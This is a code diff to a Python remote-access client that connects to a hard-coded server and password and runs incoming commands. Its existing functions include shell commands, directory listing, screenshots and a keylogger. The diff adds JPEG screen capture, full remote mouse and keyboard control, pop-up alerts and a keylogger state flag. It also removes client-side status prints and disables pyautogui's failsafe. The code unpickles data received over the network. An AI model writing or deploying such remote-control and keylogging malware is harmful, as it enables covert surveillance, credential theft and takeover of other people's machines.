@@ -13,6 +13,9 @@ import psutil
 import ssl
 import random
 import string
+import cv2
+import numpy as np
+import pyautogui as ptg
 
 class App():
     def __init__(self, hostname, port, password):
@@ -39,7 +42,6 @@ class App():
 
                 if data == "PINGED":
                     self.status = "PINGED"
-                    print("client pinged")
                     self.socket.send(self.id.encode())
                 if data == "SELECTED":
                     self.socket.send(self.password.encode())
@@ -47,9 +49,8 @@ class App():
                     self.socket.send(self.id.encode())
                     data = self.socket.recv(1024).decode()
                     if data == "GRANTED":
-                        print("client selected")
                         self.status = "SELECTED"
-                        self.socket.settimeout(10)
+                        self.socket.settimeout(1000)
                         while self.status != "CLOSED":
                             
                             header = self.socket.recv(4096).decode()
@@ -67,21 +68,20 @@ class App():
                             
                             bytes_data = b""
                             while len(bytes_data) < size:
-                                packet = self.socket.recv(min(65536, size - len(bytes_data)))
+                                packet = self.socket.recv(size - len(bytes_data)) #change to (for stability): min(65536, size - len(bytes_data))
                                 if not packet:
                                     raise ConnectionError("connection broken while receiving data")
                                 bytes_data += packet
                             data = pickle.loads(bytes_data)
                             
-                            #do things
                             header, data = self.gamberge(type_, name, data)
                             
-                            data = pickle.dumps(data)
+                            if header.split(":")[0] != "IMG":
+                                data = pickle.dumps(data)
                             header = header.split(":")
                             header = f"{header[0]}:{len(data)}:{header[1]}"
                             
                             self.socket.send(header.encode()) #send header
-                            time.sleep(0.05)
                             self.socket.sendall(data) #send data
                         
 
@@ -161,6 +161,7 @@ class CMD():
         self.command = ""
         self.key_listener = None
         self.keys_log = []
+        self.keylogger_running = False
         
     def get_command(self, command_name):
         if command_name in ["__init__", "get_command", "on_press", "listen_keys"]:
@@ -184,7 +185,7 @@ class CMD():
             return os.listdir(path), "LIST_DIR"
         
     def rename(self):
-        path = os.path.join(os.path.dirname(self.args[0]), self.args[1])
+        path = os.path.join(os.path.dirname(self.args[0]).replace("\\", "/"), self.args[1].replace("\\", "/")).replace("\\", "/")
         os.rename(self.args[0], path)
         return "Done", "RENAME"
     
@@ -251,9 +252,26 @@ class CMD():
     def screenshot(self):
         with mss.mss() as sct:
             monitor = sct.monitors[0]
+            if len(self.args) == 1:
+                index = int(self.args[0]) + 1
+                if 0 <= index < len(sct.monitors):
+                    monitor = sct.monitors[index]
+
             screenshot = sct.grab(monitor)
-        self.type = "MSS_IMG"
-        return screenshot, "SCREENSHOT"
+            img = np.array(screenshot)
+    
+            if img is None or img.size == 0:
+                return "failed to capture screen", "SCREENSHOT"
+    
+            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+            success, img_encoded = cv2.imencode('.jpg', img, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
+    
+            if not success:
+                return "failed to encode image", "SCREENSHOT"
+            img_bytes = img_encoded.tobytes()
+        
+        self.type = "IMG"
+        return img_bytes, "SCREENSHOT"
     
     def cmd(self):
         try:
@@ -263,9 +281,11 @@ class CMD():
         return output, "CMD"
     
     def keylogger(self):
-        if self.args[0] == "on":
+        if self.args[0] == "on" and not self.keylogger_running:
+            self.keylogger_running = True
             threading.Thread(target=self.listen_keys, daemon=True).start()
-        elif self.args[0] == "off":
+        elif self.args[0] == "off" and self.keylogger_running:
+            self.keylogger_running = False
             self.key_listener.stop()
         elif self.args[0] == "clear":
             self.keys_log = []
@@ -308,12 +328,84 @@ class CMD():
         print(self.args)
         return "Done", "PRINT"
     
+    def mousepos(self):
+        return ptg.position(), "MOUSE_POS"
+    
+    def mouseclick(self):
+        def action():
+            ptg.click(int(self.args[0]), int(self.args[1]), clicks=int(self.args[2]) if len(self.args) > 2 else 1, 
+                      interval=int(self.args[3]) if len(self.args) > 3 else 0.0, button=self.args[4] if len(self.args) > 4 else "left")
+        threading.Thread(target=action, daemon=True).start()
+        return "Done", "MOUSE_CLICK"
+    
+    def mousedown(self):
+        ptg.mouseDown(int(self.args[0]), int(self.args[1]), button=self.args[2] if len(self.args) > 2 else "left")
+        return "Done", "MOUSE_DOWN"
+        
+    def mouseup(self):
+        ptg.mouseUp(int(self.args[0]), int(self.args[1]), button=self.args[2] if len(self.args) > 2 else "left")
+        return "Done", "MOUSE_UP"
+    
+    def mousedrag(self):
+        def action():
+            ptg.drag(int(self.args[0]), int(self.args[1]), duration=int(self.args[2]) if len(self.args) > 2 else 0.0, button=self.args[3] if len(self.args) > 3 else "left")
+        threading.Thread(target=action, daemon=True).start()
+        return "Done", "MOUSE_DRAG"
+    
+    def mousedragto(self):
+        def action():
+            ptg.dragTo(int(self.args[0]), int(self.args[1]), duration=int(self.args[2]) if len(self.args) > 2 else 0.0, button=self.args[3] if len(self.args) > 3 else "left")   
+        threading.Thread(target=action, daemon=True).start()
+        return "Done", "MOUSE_DRAG_TO"
+    
+    def mousemove(self):
+        def action():
+            ptg.move(int(self.args[0]), int(self.args[1]), duration=int(self.args[2]) if len(self.args) > 2 else 0.0)
+        threading.Thread(target=action, daemon=True).start()
+        return "Done", "MOUSE_MOVE"
+        
+    def mousemoveto(self):
+        def action():
+            ptg.moveTo(int(self.args[0]), int(self.args[1]), duration=int(self.args[2]) if len(self.args) > 2 else 0.0)
+        threading.Thread(target=action, daemon=True).start()
+        return "Done", "MOUSE_MOVE_TO"
+    
+    def write(self):
+        def action():
+            ptg.write(self.args[0], interval=self.args[2] if len(self.args) > 2 else 0.0)
+        threading.Thread(target=action, daemon=True).start()
+        return "Done", "WRITE"
+    
+    def press(self):
+        def action():
+            ptg.press(self.args[0], presses=self.args[2] if len(self.args) > 2 else 1, interval=self.args[3] if len(self.args) > 3 else 0.0)
+        threading.Thread(target=action, daemon=True).start()
+        return "Done", "PRESS"
+    
+    def hotkey(self):
+        ptg.hotkey(self.args)    
+        return "Done", "HOTKEY"
+    
+    def keydown(self):
+        ptg.keyDown(self.args[0])
+        return "Done", "KEY_DOWN"
+        
+    def keyup(self):
+        ptg.keyUp(self.args[0])
+        return "Done", "KEY_UP"
+    
+    def alert(self):
+        def action():
+            ptg.alert(self.args[0], self.args[1], self.args[2], timeout=100)
+        threading.Thread(target=action, daemon=True).start()
+        return "Done", "ALERT"
+    
+    def screensize(self):
+        return ptg.size(), "SCREEN_SIZE"
+    
     def close(self):
         self.controller.status = "CLOSED"
         return "Done", "CLOSE"
-    
-    def help(self):
-        return list(self.controller.commands.keys()), "HELP"
     
     def on_press(self, key):
         try:
@@ -327,5 +419,6 @@ class CMD():
     
     
 if __name__ == "__main__":
+    ptg.FAILSAFE = False
     app = App("192.168.1.19", 55277, "Id6-DIjjf032_ddo") #server ip address, port(must be same as server), password(must be same as server)
     app.run()
